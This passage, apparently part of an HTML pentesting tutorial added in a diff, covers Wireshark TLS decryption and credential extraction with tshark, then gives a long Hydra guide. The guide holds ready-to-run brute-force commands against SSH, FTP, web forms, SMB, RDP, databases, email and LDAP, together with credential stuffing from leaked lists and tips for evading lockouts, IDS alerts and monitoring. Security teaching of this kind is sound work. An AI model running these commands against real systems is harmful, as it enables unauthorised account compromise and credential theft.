+# 3. In Wireshark: Edit → Preferences → Protocols → TLS<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;→ (Pre)-Master-Secret log filename → Browse to /tmp/ssl_keys.log<br>
+# 4. Reload capture - HTTPS traffic now decrypted!<br><br>
+
+# Method 2: Use server's private key (if you own the server):<br>
+# Wireshark → Edit → Preferences → Protocols → TLS<br>
+# → RSA keys list → Add:<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;IP: 192.168.1.10<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;Port: 443<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;Protocol: http<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;Key File: /path/to/server.key<br><br>
+
+# Limitations:<br>
+# - Cannot decrypt if Diffie-Hellman (DHE/ECDHE) used without key logging<br>
+# - Cannot decrypt traffic you didn't capture from the start</div>
+            <p><strong>Real-World Use:</strong> Analyze your own HTTPS traffic for debugging, inspect encrypted malware communication (if you have keys), decrypt VPN traffic for forensics!</p>
+
+            <h5>Command-Line Power (tshark)</h5>
+            <div class="code">
+# Basic tshark usage:<br>
+tshark -r capture.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Read and display<br>
+tshark -r capture.pcap -Y "http"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Display filter<br>
+tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Extract specific fields<br><br>
+
+# Common tshark flags:<br>
+tshark -i eth0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture from interface<br>
+tshark -r file.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Read from file<br>
+tshark -w output.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Write to file<br>
+tshark -Y "filter"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Display filter<br>
+tshark -f "filter"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture filter<br>
+tshark -c 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture 100 packets<br>
+tshark -a duration:60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Auto-stop after 60 seconds<br>
+tshark -T fields&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Output as fields<br>
+tshark -e field.name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Specify field to extract<br>
+tshark -E separator=,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Field separator (for CSV)<br>
+tshark -q&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Quiet mode (no per-packet output)<br>
+tshark -z option&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Statistics<br><br>
+
+# Extract HTTP URLs:<br>
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri<br><br>
+
+# Extract DNS queries:<br>
+tshark -r capture.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name<br><br>
+
+# Extract credentials:<br>
+tshark -r capture.pcap -Y "http" | grep -i "password"<br>
+tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg<br><br>
+
+# Count packets by protocol:<br>
+tshark -r capture.pcap -qz io,phs<br><br>
+
+# Export HTTP objects:<br>
+tshark -r capture.pcap --export-objects http,./extracted/<br><br>
+
+# Statistics:<br>
+tshark -r capture.pcap -qz conv,tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP conversations<br>
+tshark -r capture.pcap -qz endpoints,ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# IP endpoints<br>
+tshark -r capture.pcap -qz http,tree&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP stats<br>
+tshark -r capture.pcap -qz dns,tree&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS stats</div>
+
+            <div class="metaphor-box">
+                <p><strong>🎯 Wireshark Mastery Summary:</strong></p>
+                <p><strong>1. Capture Strategy:</strong> Use capture filters for large networks (reduces file size). Capture everything for small networks. Always save captures for later analysis!<br><br>
+                <strong>2. Display Filters:</strong> Master these essentials: <code>http</code> (web traffic), <code>dns</code> (name resolution), <code>tcp.port == X</code> (specific service), <code>ip.addr == X</code> (specific host), <code>tcp.flags.syn == 1</code> (connection attempts), <code>tcp.analysis.retransmission</code> (network issues), <code>frame contains "password"</code> (credential search)<br><br>
+                <strong>3. Follow Streams:</strong> Right-click packet → Follow → TCP/UDP/HTTP Stream to reconstruct entire conversations. Essential for reading HTTP requests, extracting FTP credentials, analyzing protocols.<br><br>
+                <strong>4. Export Objects:</strong> File → Export Objects → HTTP/SMB to extract transferred files (images, downloads, documents, malware samples)<br><br>
+                <strong>5. Statistics:</strong> Use Protocol Hierarchy for overview, Conversations to see who's talking to who, Endpoints to identify traffic volume. Use Expert Info (bottom-left) to automatically find problems.<br><br>
+                <strong>6. SSL Decryption:</strong> Set <code>SSLKEYLOGFILE=/tmp/keys.log</code> BEFORE browsing, then load keys in Wireshark (Edit → Preferences → Protocols → TLS → Pre-Master-Secret log filename)<br><br>
+                <strong>7. tshark Power:</strong> Automate analysis with <code>-Y</code> display filters, extract specific fields with <code>-T fields -e field.name</code>, generate statistics with <code>-qz</code>, export objects with <code>--export-objects</code><br><br>
+                <strong>Real-World Workflows:</strong><br>
+                • <strong>Web debugging:</strong> http filter → Follow HTTP Stream → Check request/response → Identify slow resources<br>
+                • <strong>Malware analysis:</strong> dns filter → Identify C2 domains → http filter → Export Objects → Analyze payloads<br>
+                • <strong>Network troubleshooting:</strong> tcp.analysis.retransmission → Expert Info → Identify packet loss/delays<br>
+                • <strong>Credential harvesting:</strong> frame contains "password" → Follow TCP Stream → Extract plaintext credentials<br>
+                • <strong>WiFi pentesting:</strong> Capture on wlan0mon → eapol filter → Extract WPA handshake → Crack with aircrack-ng<br><br>
+                <strong>Golden Rules:</strong> (1) Capture first, ask questions later. (2) Use display filters, not capture filters (more flexible). (3) Follow streams to see the full picture. (4) Check Expert Info for automatic problem detection. (5) Save your captures! 🦈</p>
+            </div>
+
+            <h4>Hydra (THE Multi-Protocol Brute-Forcing Tool)</h4>
+
+            <p><strong>What is Hydra?</strong> Hydra (also called THC-Hydra) is a <strong>parallelized network authentication cracker</strong>. It supports brute-forcing and dictionary attacks against 50+ protocols including SSH, FTP, HTTP, HTTPS, SMB, RDP, VNC, MySQL, PostgreSQL, MSSQL, SMTP, POP3, IMAP, LDAP, and many more. Think of it as the "Swiss Army knife" of password cracking - one tool, dozens of protocols!</p>
+            <p><strong>Why Hydra?</strong> It's FAST (parallel connections), supports tons of protocols, has smart features (resume sessions, flexible username/password lists), and is the go-to tool for brute-forcing network services during pentests!</p>
+
+            <h5>Basic Installation & Usage</h5>
+            <div class="code">
+# Hydra is pre-installed on Kali Linux<br>
+hydra -h<br><br>
+
+# Or install on other systems:<br>
+sudo apt install hydra&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Debian/Ubuntu<br>
+sudo yum install hydra&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# RedHat/CentOS<br>
+brew install hydra&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# macOS<br><br>
+
+# Basic syntax:<br>
+hydra [options] [target] [protocol]://[IP/hostname]</div>
+
+            <h5>Essential Hydra Flags</h5>
+            <div class="code">
+# Target specification:<br>
+-l LOGIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Single username<br>
+-L FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Username list file<br>
+-p PASS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Single password<br>
+-P FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Password list file<br>
+-C FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Colon-separated "login:pass" file<br>
+-M FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# List of target servers (one per line)<br><br>
+
+# Performance options:<br>
+-t TASKS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Number of parallel connections (default: 16)<br>
+-w TIMEOUT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Timeout in seconds (default: 30)<br>
+-W WAITTIME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Wait time between attempts (throttling)<br><br>
+
+# Control options:<br>
+-f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exit after first found login/password<br>
+-F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exit after first valid login for any user<br>
+-v&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Verbose output (show attempts)<br>
+-V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Very verbose (show login+pass for every attempt)<br>
+-q&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Quiet mode (don't show attempts)<br>
+-o FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Write results to file<br>
+-b FORMAT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Output format (text, json, jsonv1)<br><br>
+
+# Protocol-specific options:<br>
+-s PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Custom port number<br>
+-S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Use SSL/TLS<br>
+-m OPT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Module-specific options (varies by protocol)<br><br>
+
+# Advanced options:<br>
+-e nsr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Try "n" (null password), "s" (same as username), "r" (reverse username)<br>
+-u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Loop users first (try all passwords for user1, then user2, etc.)<br>
+-R&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Restore previous session<br>
+-I&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Ignore existing restore file (start fresh)</div>
+
+            <p><strong>Flag Explanations:</strong></p>
+            <ul>
+                <li><strong>-l / -L:</strong> Single username vs username list. Use -L for realistic attacks (try multiple usernames)</li>
+                <li><strong>-p / -P:</strong> Single password vs password list. Use -P with rockyou.txt or custom wordlists</li>
+                <li><strong>-C:</strong> Colon-separated format (user:pass per line) - useful for credential stuffing attacks</li>
+                <li><strong>-t:</strong> Parallel connections. Higher = faster BUT may trigger account lockouts or IDS alerts! Start with 4-8 for stealth</li>
+                <li><strong>-w:</strong> Connection timeout. Increase for slow networks, decrease for fast scans</li>
+                <li><strong>-f:</strong> Stop after first success. Good for testing if ANY credentials work</li>
+                <li><strong>-v / -V:</strong> Verbose output. Use -v to monitor progress, -V for debugging</li>
+                <li><strong>-e nsr:</strong> Try common patterns: n=null password (""), s=same as username (user=user, pass=user), r=reverse (user=john, pass=nhoj)</li>
+                <li><strong>-u:</strong> Loop users NOT passwords. Default tries all passwords for user1, then user2. Use -u to avoid account lockouts!</li>
+                <li><strong>-S:</strong> Use SSL/TLS. Essential for HTTPS, FTPS, IMAPS, POP3S, etc.</li>
+            </ul>
+
+            <h5>SSH Brute-Forcing</h5>
+            <div class="code">
+# Single username, password list:<br>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5<br><br>
+
+# Username + password lists:<br>
+hydra -L users.txt -P passwords.txt ssh://192.168.1.100<br><br>
+
+# Custom port:<br>
+hydra -l root -P passwords.txt ssh://10.10.10.5 -s 2222<br><br>
+
+# Verbose with 4 parallel connections (stealthy):<br>
+hydra -l admin -P rockyou.txt -t 4 -v ssh://target.com<br><br>
+
+# Try common patterns (null, same as username, reverse):<br>
+hydra -L users.txt -e nsr ssh://10.10.10.5<br><br>
+
+# Loop users first (avoid lockout):<br>
+hydra -L users.txt -P passwords.txt -u ssh://10.10.10.5<br><br>
+
+# Save results to file:<br>
+hydra -l admin -P rockyou.txt -o ssh_results.txt ssh://10.10.10.5</div>
+            <p><strong>Real-World Use:</strong> SSH is commonly exposed on pentests. Use small, targeted wordlists first (top 100 passwords), then escalate to rockyou.txt. ALWAYS use -u flag to avoid account lockouts!</p>
+
+            <h5>FTP Brute-Forcing</h5>
+            <div class="code">
+# Basic FTP attack:<br>
+hydra -l admin -P passwords.txt ftp://10.10.10.5<br><br>
+
+# Custom port + verbose:<br>
+hydra -l ftp -P rockyou.txt -s 2121 -v ftp://target.com<br><br>
+
+# Try anonymous login + common passwords:<br>
+hydra -l anonymous -e nsr ftp://192.168.1.100<br><br>
+
+# Multiple targets from file:<br>
+hydra -l admin -P passwords.txt -M ftp_targets.txt ftp</div>
+            <p><strong>Pro Tip:</strong> Always try "anonymous:anonymous" or "anonymous:" (null password) first - many FTP servers allow anonymous login!</p>
+
+            <h5>HTTP/HTTPS Form Brute-Forcing</h5>
+            <div class="code">
+# HTTP POST form attack:<br>
+hydra -l admin -P passwords.txt 10.10.10.5 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"<br><br>
+
+# HTTP GET form attack:<br>
+hydra -l admin -P passwords.txt target.com http-get-form "/admin/login:user=^USER^&pass=^PASS^:F=incorrect"<br><br>
+
+# HTTPS POST (SSL):<br>
+hydra -l admin -P passwords.txt -S https://target.com http-post-form "/login:username=^USER^&password=^PASS^:Login failed"<br><br>
+
+# With custom headers (User-Agent, Cookie):<br>
+hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid:H=User-Agent\: Mozilla/5.0:Cookie\: sessionid=abc123"<br><br>
+
+# Success condition (redirect or success message):<br>
+hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:S=Welcome"</div>
+            <p><strong>Form Syntax Breakdown:</strong></p>
+            <ul>
+                <li><strong>"/login.php":</strong> Path to login form</li>
+                <li><strong>"username=^USER^&password=^PASS^":</strong> POST parameters (^USER^ and ^PASS^ are placeholders)</li>
+                <li><strong>"Invalid credentials":</strong> Failure message (text that appears when login fails)</li>
+                <li><strong>F=text:</strong> Failure condition (F= means look for this text on failure)</li>
+                <li><strong>S=text:</strong> Success condition (S= means look for this text on success)</li>
+                <li><strong>H=header:</strong> Add custom HTTP headers (multiple H= allowed)</li>
+            </ul>
+            <p><strong>How to Find Form Parameters:</strong> Use Burp Suite to capture login request, copy POST data, replace username/password values with ^USER^ and ^PASS^</p>
+
+            <h5>HTTP Basic Authentication</h5>
+            <div class="code">
+# HTTP Basic Auth:<br>
+hydra -l admin -P passwords.txt http-get://10.10.10.5/admin<br><br>
+
+# HTTPS Basic Auth:<br>
+hydra -l admin -P passwords.txt -S https://target.com/restricted<br><br>
+
+# Custom port:<br>
+hydra -l admin -P passwords.txt -s 8080 http-get://target.com/admin</div>
+            <p><strong>What is Basic Auth?</strong> That popup box asking for username/password (not an HTML form). Common on routers, network devices, admin panels.</p>
+
+            <h5>SMB / Windows Share Brute-Forcing</h5>
+            <div class="code">
+# SMB attack (Windows shares):<br>
+hydra -l Administrator -P passwords.txt smb://10.10.10.5<br><br>
+
+# Try null sessions + common passwords:<br>
+hydra -L users.txt -e nsr smb://192.168.1.100<br><br>
+
+# Domain authentication:<br>
+hydra -l DOMAIN\\username -P passwords.txt smb://10.10.10.5</div>
+            <p><strong>Real-World Use:</strong> SMB brute-forcing against Windows machines. Use with username enumeration (enum4linux, CrackMapExec) to build target list!</p>
+
+            <h5>RDP (Remote Desktop) Brute-Forcing</h5>
+            <div class="code">
+# RDP attack:<br>
+hydra -l administrator -P passwords.txt rdp://10.10.10.5<br><br>
+
+# Custom port + verbose:<br>
+hydra -l admin -P passwords.txt -s 3390 -v rdp://target.com<br><br>
+
+# Low parallel connections (avoid lockout):<br>
+hydra -l admin -P passwords.txt -t 2 rdp://10.10.10.5</div>
+            <p><strong>WARNING:</strong> RDP often has account lockout policies! Use -t 1 or -t 2 (very slow) and -u flag (loop users). Consider using domain password policies to time attacks (e.g., lockout resets after 30 minutes).</p>
+
+            <h5>VNC Brute-Forcing</h5>
+            <div class="code">
+# VNC attack (VNC uses password-only auth, no username):<br>
+hydra -P passwords.txt vnc://10.10.10.5<br><br>
+
+# Custom port:<br>
+hydra -P passwords.txt -s 5901 vnc://target.com</div>
+            <p><strong>VNC Note:</strong> VNC doesn't use usernames, only passwords! Use -P flag without -l / -L.</p>
+
+            <h5>Database Brute-Forcing</h5>
+            <div class="code">
+# MySQL:<br>
+hydra -l root -P passwords.txt mysql://10.10.10.5<br><br>
+
+# PostgreSQL:<br>
+hydra -l postgres -P passwords.txt postgresql://10.10.10.5<br><br>
+
+# MSSQL (Microsoft SQL Server):<br>
+hydra -l sa -P passwords.txt mssql://10.10.10.5<br><br>
+
+# MongoDB (no auth by default, but can be configured):<br>
+hydra -l admin -P passwords.txt mongodb://10.10.10.5<br><br>
+
+# Oracle:<br>
+hydra -l system -P passwords.txt oracle-listener://10.10.10.5</div>
+            <p><strong>Common DB Users:</strong> MySQL: root, admin, dbuser | PostgreSQL: postgres, admin | MSSQL: sa (system admin), Administrator | MongoDB: admin, root</p>
+
+            <h5>Email Protocol Brute-Forcing</h5>
+            <div class="code">
+# SMTP (port 25, 587, 465):<br>
+hydra -l user@example.com -P passwords.txt smtp://mail.example.com<br>
+hydra -l user@example.com -P passwords.txt -s 587 smtp://mail.example.com<br>
+hydra -l user@example.com -P passwords.txt -S smtps://mail.example.com&nbsp;&nbsp;# SSL<br><br>
+
+# POP3 (port 110, 995):<br>
+hydra -l user@example.com -P passwords.txt pop3://mail.example.com<br>
+hydra -l user@example.com -P passwords.txt -S pop3s://mail.example.com&nbsp;&nbsp;# SSL<br><br>
+
+# IMAP (port 143, 993):<br>
+hydra -l user@example.com -P passwords.txt imap://mail.example.com<br>
+hydra -l user@example.com -P passwords.txt -S imaps://mail.example.com&nbsp;&nbsp;# SSL</div>
+            <p><strong>Email Attack Strategy:</strong> Enumerate valid email addresses first (use theHarvester, Hunter.io), then brute-force with targeted wordlists (company name variations, seasons+year, etc.)</p>
+
+            <h5>LDAP Brute-Forcing</h5>
+            <div class="code">
+# LDAP (Active Directory):<br>
+hydra -l CN=admin,DC=example,DC=com -P passwords.txt ldap://10.10.10.5<br><br>
+
+# LDAPS (SSL):<br>
+hydra -l admin@example.com -P passwords.txt -S ldaps://dc.example.com</div>
+
+            <h5>Other Supported Protocols</h5>
+            <div class="code">
+# Telnet:<br>
+hydra -l admin -P passwords.txt telnet://10.10.10.5<br><br>
+
+# Cisco devices (enable password):<br>
+hydra -P passwords.txt cisco://10.10.10.5<br>
+hydra -P passwords.txt cisco-enable://10.10.10.5<br><br>
+
+# SNMP community strings:<br>
+hydra -P community_strings.txt snmp://10.10.10.5<br><br>
+
+# Redis:<br>
+hydra -P passwords.txt redis://10.10.10.5<br><br>
+
+# Rlogin:<br>
+hydra -l root -P passwords.txt rlogin://10.10.10.5<br><br>
+
+# Rsh:<br>
+hydra -l root -P passwords.txt rsh://10.10.10.5<br><br>
+
+# CVS:<br>
+hydra -l admin -P passwords.txt cvs://10.10.10.5<br><br>
+
+# Subversion (SVN):<br>
+hydra -l admin -P passwords.txt svn://10.10.10.5<br><br>
+
+# IRC:<br>
+hydra -l nickname -P passwords.txt irc://irc.server.com<br><br>
+
+# SOCKS5 proxy:<br>
+hydra -l user -P passwords.txt socks5://10.10.10.5</div>
+
+            <h5>Advanced Techniques</h5>
+            <div class="code">
+# Restore interrupted session:<br>
+# Hydra saves progress automatically<br>
+hydra -R&nbsp;&nbsp;# Resume last session<br><br>
+
+# Ignore restore file (start fresh):<br>
+hydra -I -l admin -P passwords.txt ssh://10.10.10.5<br><br>
+
+# Multiple targets:<br>
+# Create targets.txt (one IP/hostname per line)<br>
+hydra -l admin -P passwords.txt -M targets.txt ssh<br><br>
+
+# Colon-separated credentials (credential stuffing):<br>
+# Create creds.txt with format: username:password<br>
+hydra -C leaked_credentials.txt ssh://10.10.10.5<br><br>
+
+# Custom timing (slow, stealthy):<br>
+hydra -l admin -P passwords.txt -t 1 -w 30 ssh://10.10.10.5<br>
+# -t 1 = one connection at a time<br>
+# -w 30 = 30 second timeout<br><br>
+
+# JSON output:<br>
+hydra -l admin -P passwords.txt -b jsonv1 -o results.json ssh://10.10.10.5<br><br>
+
+# Proxy through another host:<br>
+hydra -l admin -P passwords.txt ssh://10.10.10.5 -m PROXY:proxy.example.com:8080</div>
+
+            <h5>Wordlist Strategies</h5>
+            <div class="code">
+# Common wordlist locations (Kali Linux):<br>
+/usr/share/wordlists/rockyou.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 14 million passwords<br>
+/usr/share/wordlists/dirb/common.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Common passwords<br>
+/usr/share/seclists/Passwords/Common-Credentials/&nbsp;&nbsp;# Curated lists<br>
+/usr/share/seclists/Passwords/darkweb2017-top10000.txt<br><br>
+
+# Extract rockyou.txt (if compressed):<br>
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz<br><br>
+
+# Create custom wordlist (CeWL - website spider):<br>
+cewl https://target-company.com -d 2 -m 5 -w custom_wordlist.txt<br>
+# -d 2 = depth 2<br>
+# -m 5 = minimum word length 5<br><br>
+
+# Generate password variations (John the Ripper rules):<br>
+john --wordlist=words.txt --rules --stdout > expanded_wordlist.txt<br><br>
+
+# Create targeted wordlist:<br>
+# Company name variations, seasons+year, common patterns<br>
+echo -e "Company123\nCompany2024\nWinter2024\nSummer2024\nPassword123" > custom.txt</div>
+
+            <h5>Hydra GUI (hydra-gtk)</h5>
+            <div class="code">
+# Launch GUI version:<br>
+hydra-gtk<br><br>
+
+# GUI provides:<br>
+# - Point-and-click interface<br>
+# - Protocol selection dropdown<br>
+# - Username/password file selection<br>
+# - Visual progress monitoring<br>
+# - Easy option configuration</div>
+            <p><strong>When to Use GUI:</strong> Great for beginners learning Hydra syntax, quick one-off attacks, visual progress monitoring. CLI is better for scripting and advanced usage!</p>
+
+            <div class="metaphor-box">
+                <p><strong>🎯 Hydra Mastery Summary:</strong></p>
+                <p><strong>Essential Commands by Protocol:</strong><br>
+                • <strong>SSH:</strong> <code>hydra -L users.txt -P passwords.txt -u ssh://10.10.10.5</code><br>
+                • <strong>FTP:</strong> <code>hydra -l admin -P rockyou.txt ftp://target.com</code><br>
+                • <strong>HTTP POST:</strong> <code>hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"</code><br>
+                • <strong>HTTP Basic Auth:</strong> <code>hydra -l admin -P passwords.txt http-get://target.com/admin</code><br>
+                • <strong>SMB:</strong> <code>hydra -L users.txt -P passwords.txt smb://10.10.10.5</code><br>
+                • <strong>RDP:</strong> <code>hydra -l administrator -P passwords.txt -t 2 rdp://10.10.10.5</code><br>
+                • <strong>MySQL:</strong> <code>hydra -l root -P passwords.txt mysql://10.10.10.5</code><br>
+                • <strong>SMTP:</strong> <code>hydra -l user@example.com -P passwords.txt smtp://mail.example.com</code><br><br>
+                
+                <strong>Critical Flags to Remember:</strong><br>
+                • <code>-l</code> / <code>-L</code>: Single username / username list<br>
+                • <code>-p</code> / <code>-P</code>: Single password / password list<br>
+                • <code>-t</code>: Parallel connections (higher = faster, but noisier!)<br>
+                • <code>-u</code>: Loop users first (PREVENTS account lockouts!)<br>
+                • <code>-f</code>: Stop after first success<br>
+                • <code>-v</code>: Verbose (monitor progress)<br>
+                • <code>-e nsr</code>: Try null, same-as-username, reverse patterns<br>
+                • <code>-o</code>: Output results to file<br>
+                • <code>-S</code>: Use SSL/TLS<br>
+                • <code>-R</code>: Resume interrupted session<br><br>
+                
+                <strong>Attack Strategies:</strong><br>
+                1. <strong>Reconnaissance First:</strong> Enumerate valid usernames (enum4linux, OSINT) before attacking<br>
+                2. <strong>Start Small:</strong> Test with top 100 passwords before using rockyou.txt (14M passwords!)<br>
+                3. <strong>Avoid Lockouts:</strong> ALWAYS use <code>-u</code> flag and low <code>-t</code> values (2-4) for authentication services<br>
+                4. <strong>Custom Wordlists:</strong> Create targeted lists (company name, seasons, years) for better success rates<br>
+                5. <strong>Timing Matters:</strong> Attack during business hours (less suspicious) or after hours (less monitoring)<br>
